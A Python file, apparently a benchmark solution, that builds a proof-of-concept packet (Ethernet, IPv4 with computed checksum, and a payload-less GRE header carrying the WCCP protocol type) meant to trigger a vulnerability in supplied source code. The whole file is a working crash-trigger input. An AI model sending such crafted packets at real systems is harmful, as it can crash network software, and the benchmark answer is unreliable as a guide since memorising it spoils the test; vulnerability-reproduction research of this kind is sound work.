import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """

        def _ip_checksum(data: bytes) -> int:
            s = 0
            if len(data) % 2 == 1:
                data += b'\x00'

            for i in range(0, len(data), 2):
                w = (data[i] << 8) + data[i+1]
                s += w

            while (s >> 16):
                s = (s & 0xFFFF) + (s >> 16)

            return ~s & 0xFFFF

        # Ethernet Header (14 bytes): Dst MAC, Src MAC, EtherType IPv4
        eth_header = b'\x00\x00\x00\x00\x00\x00' + \
                     b'\x00\x00\x00\x00\x00\x00' + \
                     b'\x08\x00'

        # IPv4 Header (20 bytes)
        ip_ver_ihl = 0x45
        ip_tos = 0
        ip_total_len = 20 + 4  # IP header (20) + GRE header (4)
        ip_id = 0
        ip_frag_off = 0
        ip_ttl = 64
        ip_proto = 47  # GRE
        ip_check = 0  # Placeholder
        ip_saddr = b'\x7f\x00\x00\x01'
        ip_daddr = b'\x7f\x00\x00\x01'

        ip_header_no_check = struct.pack(
            '!BBHHHBBH',
            ip_ver_ihl, ip_tos, ip_total_len,
            ip_id, ip_frag_off,
            ip_ttl, ip_proto, ip_check
        ) + ip_saddr + ip_daddr

        checksum = _ip_checksum(ip_header_no_check)

        ip_header = struct.pack(
            '!BBHHHBBH',
            ip_ver_ihl, ip_tos, ip_total_len,
            ip_id, ip_frag_off,
            ip_ttl, ip_proto, checksum
        ) + ip_saddr + ip_daddr

        # GRE Header (4 bytes): Flags/Version, Proto Type (WCCP)
        gre_header = b'\x00\x00\x88\x3E'

        # PoC packet: Eth + IP + GRE. No payload is necessary.
        poc = eth_header + ip_header + gre_header

        return poc